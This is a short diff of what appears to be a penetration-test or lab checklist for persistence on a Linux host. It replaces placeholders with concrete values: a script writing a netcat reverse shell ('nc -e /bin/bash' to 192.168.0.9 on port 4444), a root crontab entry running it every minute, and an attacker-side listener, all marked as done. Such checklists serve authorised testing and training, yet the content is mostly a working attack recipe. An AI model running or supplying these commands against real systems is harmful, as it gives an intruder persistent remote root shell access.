@@ -35,7 +35,7 @@
 
   ```bash
   echo "#!/bin/bash" > /tmp/back.sh
-  echo "nc -e /bin/bash <your_ip> <port>" >> /tmp/back.sh
+  echo "nc -e /bin/bash 192.168.0.9 4444" >> /tmp/back.sh
   chmod +x /tmp/back.sh
   ```
 
@@ -45,7 +45,7 @@
   echo "* * * * * root /tmp/back.sh" >> /etc/crontab
   ```
 
-- [✓] Start listener on attacker machine `nc -lvnp <port>`
+- [✓] Start listener on attacker machine `nc -lvnp 4444`
 - [✓] Verify persistence connection triggered
 
 ## 📝 Evidence & Documentation
